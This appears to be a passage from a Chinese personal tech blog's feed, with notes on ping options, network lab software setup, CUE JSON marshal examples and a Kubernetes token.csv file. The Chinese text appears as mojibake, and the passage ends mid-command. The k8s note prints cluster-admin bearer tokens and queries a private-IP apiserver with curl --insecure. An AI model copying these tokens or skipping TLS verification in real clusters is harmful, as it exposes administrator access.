    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ping -h</span><br>Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface]<br>            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]<br>            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]<br>            [-w deadline] [-W <span class="hljs-built_in">timeout</span>] [hop1 ...] destination<br>Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]<br>             [-l preload] [-m mark] [-M pmtudisc_option]<br>             [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize]<br>             [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline]<br>             [-W <span class="hljs-built_in">timeout</span>] destination<br><br><br><br><span class="hljs-comment"># 01. æ¯éš”0.6ç§’pingä¸€æ¬¡ï¼Œä¸€å…±ping 5æ¬¡</span><br><span class="hljs-comment"># ping -c 5 -i 0.6 qq.com</span><br>PING qq.com (58.247.214.47) 56(84) bytes of data.<br>64 bytes from 58.247.214.47 (58.247.214.47): icmp_seq=1 ttl=49 time=25.9 ms<br>64 bytes from 58.247.214.47 (58.247.214.47): icmp_seq=2 ttl=49 time=25.2 ms<br>64 bytes from 58.247.214.47 (58.247.214.47): icmp_seq=3 ttl=49 time=25.2 ms<br>64 bytes from 58.247.214.47 (58.247.214.47): icmp_seq=4 ttl=49 time=25.3 ms<br>64 bytes from 58.247.214.47 (58.247.214.47): icmp_seq=5 ttl=49 time=25.3 ms<br><br>--- qq.com ping statistics ---<br>5 packets transmitted, 5 received, 0% packet loss, time 2404ms<br>rtt min/avg/max/mdev = 25.266/25.432/25.964/0.302 ms<br>  <br><br><span class="hljs-comment">## 02. æµ‹è¯•-I</span><br><span class="hljs-comment"># ping -I 172.28.157.146 qq.com</span><br>PING qq.com (58.250.137.36) from 172.28.157.146 : 56(84) bytes of data.<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=1 ttl=47 time=42.6 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=2 ttl=47 time=42.3 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=3 ttl=47 time=42.2 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=4 ttl=47 time=42.1 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=5 ttl=47 time=42.1 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=6 ttl=47 time=43.2 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=7 ttl=47 time=42.1 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=8 ttl=47 time=42.1 ms<br>64 bytes from 58.250.137.36 (58.250.137.36): icmp_seq=9 ttl=47 time=51.2 ms<br>^C<br>--- qq.com ping statistics ---<br>9 packets transmitted, 9 received, 0% packet loss, time 8008ms<br>rtt min/avg/max/mdev = 42.162/43.368/51.248/2.805 ms<br><br><br><span class="hljs-comment"># ping -I 192.168.20.201 qq.com</span><br>PING qq.com (58.247.214.47) from 192.168.20.201 : 56(84) bytes of data.<br>^C<br>--- qq.com ping statistics ---<br>6 packets transmitted, 0 received, 100% packet loss, time 5108ms<br><br><br>mdev å°±æ˜¯ Mean Deviation çš„ç¼©å†™ï¼Œå®ƒè¡¨ç¤ºè¿™äº› ICMP åŒ…çš„ RTT åç¦»å¹³å‡å€¼çš„ç¨‹åº¦ï¼Œè¿™ä¸ªå€¼è¶Šå¤§è¯´æ˜ä½ çš„ç½‘é€Ÿè¶Šä¸ç¨³å®šã€‚<br><br></code></pre></td></tr></table></figure><h2 id="ping-t"><a href="#ping-t" class="headerlink" title="ping -t"></a>ping -t</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ping -t www.baidu.com</span><br>Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface]<br>            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]<br>            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]<br>            [-w deadline] [-W <span class="hljs-built_in">timeout</span>] [hop1 ...] destination<br>Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]<br>             [-l preload] [-m mark] [-M pmtudisc_option]<br>             [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize]<br>             [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline]<br>             [-W <span class="hljs-built_in">timeout</span>] destination<br><br></code></pre></td></tr></table></figure><h2 id="ping-n"><a href="#ping-n" class="headerlink" title="ping -n"></a>ping -n</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ping -n 2 192.168.3.100</span><br>PING 192.168.3.100 (192.168.3.100) 56(124) bytes of data.<br>^C<br>--- 192.168.3.100 ping statistics ---<br>9 packets transmitted, 0 received, 100% packet loss, time 8179ms<br><br><br><br><span class="hljs-comment"># ping 192.168.3.100 -n 2</span><br>PING 2 (0.0.0.2) 56(124) bytes of data.<br>^C<br>--- 2 ping statistics ---<br>7 packets transmitted, 0 received, 100% packet loss, time 6139ms<br><br>[root@ningan dubhe-manager]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><h2 id="ping-c"><a href="#ping-c" class="headerlink" title="ping -c"></a>ping -c</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ping 192.168.3.100 -c 5</span><br>PING 192.168.3.100 (192.168.3.100) 56(84) bytes of data.<br>64 bytes from 192.168.3.100: icmp_seq=1 ttl=52 time=26.0 ms<br>64 bytes from 192.168.3.100: icmp_seq=2 ttl=52 time=26.5 ms<br>64 bytes from 192.168.3.100: icmp_seq=3 ttl=52 time=25.7 ms<br>64 bytes from 192.168.3.100: icmp_seq=4 ttl=52 time=26.9 ms<br>64 bytes from 192.168.3.100: icmp_seq=5 ttl=52 time=26.6 ms<br><br>--- 192.168.3.100 ping statistics ---<br>5 packets transmitted, 5 received, 0% packet loss, time 4005ms<br>rtt min/avg/max/mdev = 25.753/26.369/26.920/0.443 ms<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€è½¯è€ƒã€‘ç¯å¢ƒæ­å»º</title>
    <link href="/2023/05/09/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/05/09/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>wireshark  2.6.6<br>ensp v1.3.00<br>oracle vm virtualbox 5.2.40</p><h2 id="è½¯ä»¶ä¸‹è½½"><a href="#è½¯ä»¶ä¸‹è½½" class="headerlink" title="è½¯ä»¶ä¸‹è½½"></a>è½¯ä»¶ä¸‹è½½</h2><h3 id="virtualbox"><a href="#virtualbox" class="headerlink" title="virtualbox"></a>virtualbox</h3><p><a href="https://www.virtualbox.org/wiki/Download_Old_Builds_5_2">Download_Old_Builds_5_2 â€“ Oracle VM VirtualBox</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230510002536.png" alt="image.png"></p><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p><a href="https://www.wireshark.org/download.html">Wireshark Â· Download</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230510002852.png" alt="image.png"></p><h3 id="ensp"><a href="#ensp" class="headerlink" title="ensp"></a>ensp</h3><h3 id="winpcap"><a href="#winpcap" class="headerlink" title="winpcap"></a>winpcap</h3><h2 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h2><h3 id="æŠ¥é”™ä¿¡æ¯-æ‰€æœ‰è®¾å¤‡æ— æ³•å¯åŠ¨ï¼Œé”™è¯¯ä»£ç 40"><a href="#æŠ¥é”™ä¿¡æ¯-æ‰€æœ‰è®¾å¤‡æ— æ³•å¯åŠ¨ï¼Œé”™è¯¯ä»£ç 40" class="headerlink" title="æŠ¥é”™ä¿¡æ¯ æ‰€æœ‰è®¾å¤‡æ— æ³•å¯åŠ¨ï¼Œé”™è¯¯ä»£ç 40"></a>æŠ¥é”™ä¿¡æ¯ <strong>æ‰€æœ‰è®¾å¤‡æ— æ³•å¯åŠ¨ï¼Œé”™è¯¯ä»£ç 40</strong></h3><p>è™šæ‹Ÿç½‘å¡çš„åç§°ä¸ºâ€œVirtualBox Host-Only Ethernet Adapter #2â€ï¼Œå¯å°è¯•ç‚¹å‡»eNSPä¸»ç•Œé¢â€œèœå•-å·¥å…·-æ³¨å†Œè®¾å¤‡â€é‡æ–°æ³¨å†Œè®¾å¤‡ã€‚</p><p>æ³¨æ„éœ€è¦åˆ é™¤æ‰€æœ‰è®¾å¤‡</p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€cueè¯­è¨€ç³»åˆ—ã€‘(202305) json marshalå’Œunmarshal</title>
    <link href="/2023/05/08/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202305)%20json%20marshal%E5%92%8Cunmarshal/"/>
    <url>/2023/05/08/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202305)%20json%20marshal%E5%92%8Cunmarshal/</url>
    
    <content type="html"><![CDATA[<h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>åˆå§‹æœ‰ä¸€ä¸ªjson<br>éœ€è¦cueæ–‡ä»¶æ¥å¸®åŠ©æ‹¼æ¥ä¸€æ®µå½¢æˆä¸€ä¸ªæ–°çš„json</p><h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><h3 id="ç®€å•ç‰ˆ"><a href="#ç®€å•ç‰ˆ" class="headerlink" title="ç®€å•ç‰ˆ"></a>ç®€å•ç‰ˆ</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508170625.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>// åŸjson Marshalä¹‹åçš„å­—ç¬¦ä¸²<br>a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br><br>// step1: å…ˆunmarshal<br>b: json.Unmarshal(a)<br><br>// step2ï¼šæ‹¼æ¥æ–°çš„å†…å®¹<br>c: &#123;<br>    b<br>    <span class="hljs-string">&quot;testNew&quot;</span>: <span class="hljs-string">&quot;new&quot;</span>   // æ–°å†…å®¹<br>&#125;<br><br>// step3: è½¬æˆå­—ç¬¦ä¸²<br>cMarshal: json.Marshal(c)<br><br><br></code></pre></td></tr></table></figure><h3 id="å¤æ‚ç‰ˆ"><a href="#å¤æ‚ç‰ˆ" class="headerlink" title="å¤æ‚ç‰ˆ"></a>å¤æ‚ç‰ˆ</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508171655.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>// åŸjson Marshalä¹‹åçš„å­—ç¬¦ä¸²<br>a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br><br>// step1: å…ˆunmarshal<br>b: json.Unmarshal(a)<br><br>testValue:  &#123;<br>    <span class="hljs-string">&quot;111&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>    <span class="hljs-string">&quot;222&quot;</span>: <span class="hljs-string">&quot;222&quot;</span><br>&#125;<br><br>// step2ï¼šæ‹¼æ¥æ–°çš„å†…å®¹<br>c: &#123;<br>    b<br>    <span class="hljs-string">&quot;testNew&quot;</span>: testValue  // æ–°å†…å®¹<br>&#125;<br><br>// step3: è½¬æˆå­—ç¬¦ä¸²<br>cMarshal: json.Marshal(c)<br><br></code></pre></td></tr></table></figure><h3 id="è¿›é˜¶ç‰ˆ2ï¼šä¸€çº§æ‹¼æ¥"><a href="#è¿›é˜¶ç‰ˆ2ï¼šä¸€çº§æ‹¼æ¥" class="headerlink" title="è¿›é˜¶ç‰ˆ2ï¼šä¸€çº§æ‹¼æ¥"></a>è¿›é˜¶ç‰ˆ2ï¼šä¸€çº§æ‹¼æ¥</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508172626.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>// åŸjson Marshalä¹‹åçš„å­—ç¬¦ä¸²<br>a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br><br>// step1: å…ˆunmarshal<br>b: json.Unmarshal(a)<br><br>testValue:  &#123;<br>    <span class="hljs-string">&quot;111&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>    <span class="hljs-string">&quot;222&quot;</span>: <span class="hljs-string">&quot;222&quot;</span><br>    <span class="hljs-string">&quot;333&quot;</span>: b.test2<br>&#125;<br><br>// step2ï¼šæ‹¼æ¥æ–°çš„å†…å®¹<br>c: &#123;<br>    b<br>    <span class="hljs-string">&quot;testNew&quot;</span>: testValue  // æ–°å†…å®¹<br>&#125;<br><br>// step3: è½¬æˆå­—ç¬¦ä¸²<br>cMarshal: json.Marshal(c)<br><br></code></pre></td></tr></table></figure><h3 id="è¿›é˜¶ç‰ˆ2çš„å¦ä¸€ç§å†™æ³•"><a href="#è¿›é˜¶ç‰ˆ2çš„å¦ä¸€ç§å†™æ³•" class="headerlink" title="è¿›é˜¶ç‰ˆ2çš„å¦ä¸€ç§å†™æ³•"></a>è¿›é˜¶ç‰ˆ2çš„å¦ä¸€ç§å†™æ³•</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508182001.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>self: &#123;<br>    // step1: å…ˆunmarshal<br>    b: json.Unmarshal(<span class="hljs-string">&quot;\(global.a)&quot;</span>)<br>    <br>    testValue:  &#123;<br>        <span class="hljs-string">&quot;111&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>        <span class="hljs-string">&quot;222&quot;</span>: <span class="hljs-string">&quot;222&quot;</span><br>        <span class="hljs-string">&quot;333&quot;</span>: b.test2<br>    &#125;<br>    <br>    // step2ï¼šæ‹¼æ¥æ–°çš„å†…å®¹<br>    c: &#123;<br>        b<br>        <span class="hljs-string">&quot;testNew&quot;</span>: testValue  // æ–°å†…å®¹<br>    &#125;<br>&#125;<br><br>global: &#123;<br>    // åŸjson Marshalä¹‹åçš„å­—ç¬¦ä¸²<br>    a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br>    <br>    <br>    // step3: è½¬æˆå­—ç¬¦ä¸²<br>    cMarshal: json.Marshal(self.c)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è¿›é˜¶ç‰ˆ3ï¼šä¸¤çº§æ‹¼æ¥"><a href="#è¿›é˜¶ç‰ˆ3ï¼šä¸¤çº§æ‹¼æ¥" class="headerlink" title="è¿›é˜¶ç‰ˆ3ï¼šä¸¤çº§æ‹¼æ¥"></a>è¿›é˜¶ç‰ˆ3ï¼šä¸¤çº§æ‹¼æ¥</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508191318.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>// åŸjson Marshalä¹‹åçš„å­—ç¬¦ä¸²<br>a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br>a2: <span class="hljs-string">&quot;&#123;\&quot;test1bbbb\&quot;:\&quot;1\&quot;,\&quot;test2bbbb\&quot;:\&quot;2\&quot;&#125;&quot;</span><br><br>// step1: å…ˆunmarshal<br>b: json.Unmarshal(a)<br>b2: json.Unmarshal(a2)<br><br>testValue:  &#123;<br>    <span class="hljs-string">&quot;111&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>    <span class="hljs-string">&quot;222&quot;</span>: <span class="hljs-string">&quot;222&quot;</span><br>    <span class="hljs-string">&quot;333&quot;</span>: b.test2<br>    b2<br>&#125;<br><br>// step2ï¼šæ‹¼æ¥æ–°çš„å†…å®¹<br>c: &#123;<br>    b<br>    <span class="hljs-string">&quot;testNew&quot;</span>: testValue  // æ–°å†…å®¹<br>&#125;<br><br>// step3: è½¬æˆå­—ç¬¦ä¸²<br>cMarshal: json.Marshal(c)<br><br></code></pre></td></tr></table></figure><h3 id="è¿›é˜¶ç‰ˆ3çš„å¦ä¸€ç§å†™æ³•"><a href="#è¿›é˜¶ç‰ˆ3çš„å¦ä¸€ç§å†™æ³•" class="headerlink" title="è¿›é˜¶ç‰ˆ3çš„å¦ä¸€ç§å†™æ³•"></a>è¿›é˜¶ç‰ˆ3çš„å¦ä¸€ç§å†™æ³•</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230508191505.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">import (<br>  <span class="hljs-string">&quot;encoding/json&quot;</span><br>)<br><br>self: &#123;<br>    // step1: å…ˆunmarshal<br>    b: json.Unmarshal(<span class="hljs-string">&quot;\(global.a)&quot;</span>)<br>    b2: json.Unmarshal(<span class="hljs-string">&quot;\(global.a2)&quot;</span>)<br>    <br>    testValue:  &#123;<br>        b2<br>        <span class="hljs-string">&quot;111&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>        <span class="hljs-string">&quot;222&quot;</span>: <span class="hljs-string">&quot;222&quot;</span><br>        <span class="hljs-string">&quot;333&quot;</span>: b.test2<br>    &#125;<br>    <br>    // step2ï¼šæ‹¼æ¥æ–°çš„å†…å®¹<br>    c: &#123;<br>        b<br>        <span class="hljs-string">&quot;testNew&quot;</span>: testValue  // æ–°å†…å®¹<br>    &#125;<br>&#125;<br><br><br>global: &#123;<br>    // åŸjson Marshalä¹‹åçš„å­—ç¬¦ä¸²<br>    a: <span class="hljs-string">&quot;&#123;\&quot;test1\&quot;:\&quot;1\&quot;,\&quot;test2\&quot;:\&quot;2\&quot;&#125;&quot;</span><br>    a2: <span class="hljs-string">&quot;&#123;\&quot;test1bbbb\&quot;:\&quot;1\&quot;,\&quot;test2bbbb\&quot;:\&quot;2\&quot;&#125;&quot;</span><br>    <br>    <br>    // step3: è½¬æˆå­—ç¬¦ä¸²<br>    cMarshal: json.Marshal(self.c)<br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202305) token.csv</title>
    <link href="/2023/05/08/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202305)%20token.csv/"/>
    <url>/2023/05/08/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202305)%20token.csv/</url>
    
    <content type="html"><![CDATA[<h2 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h2><p>token.csv<br>è¯¥æ–‡ä»¶ä¸ºä¸€ä¸ªç”¨æˆ·çš„æè¿°æ–‡ä»¶ï¼ŒåŸºæœ¬æ ¼å¼ä¸º Token,ç”¨æˆ·å,UID,ç”¨æˆ·ç»„ï¼›è¿™ä¸ªæ–‡ä»¶åœ¨ apiserver å¯åŠ¨æ—¶è¢« apiserver åŠ è½½ï¼Œç„¶åå°±ç›¸å½“äºåœ¨é›†ç¾¤å†…åˆ›å»ºäº†ä¸€ä¸ªè¿™ä¸ªç”¨æˆ·ï¼›æ¥ä¸‹æ¥å°±å¯ä»¥ç”¨ RBAC ç»™ä»–æˆæƒ</p><p>è¿™äº› token çš„å½¢å¼æ˜¯Â <code>[a-z0-9]&#123;6&#125;.[a-z0-9]&#123;16&#125;</code>ã€‚ç¬¬ä¸€éƒ¨åˆ†æ˜¯ Token IDï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯ Token Secretã€‚</p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##### 1. apiserverçš„å¯åŠ¨å‚æ•°ä¸­æ·»åŠ </span><br>--token-auth-file=xxx/token.csv<br><br><span class="hljs-comment">##### 2. æŸ¥çœ‹å†…å®¹</span><br><span class="hljs-comment"># cat token.csv </span><br>12ba4f.d82a57a4433b2359,<span class="hljs-string">&quot;system:admin&quot;</span>,10001,<span class="hljs-string">&quot;system:masters&quot;</span><br>12ba4f.d82a57a4433b2358,<span class="hljs-string">&quot;system:admin&quot;</span>,10001,<span class="hljs-string">&quot;system:admin&quot;</span><br><br><span class="hljs-comment">##### 3. æµ‹è¯•1ï¼šsystem:masters</span><br><span class="hljs-comment"># curl https://192.168.3.100:16941/api/v1/nodes  --header &quot;Authorization: Bearer 12ba4f.d82a57a4433b2359&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;NodeList&quot;</span>,<br>  <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>  <span class="hljs-string">&quot;metadata&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;resourceVersion&quot;</span>: <span class="hljs-string">&quot;5899&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;items&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;metadata&quot;</span>: &#123;<br>...<br><br><span class="hljs-comment">##### 3. æµ‹è¯•2ï¼šsystem:admin</span><br><span class="hljs-comment"># curl https://192.168.3.100:16941/api/v1/nodes  --header &quot;Authorization: Bearer 12ba4f.d82a57a4433b2358&quot; 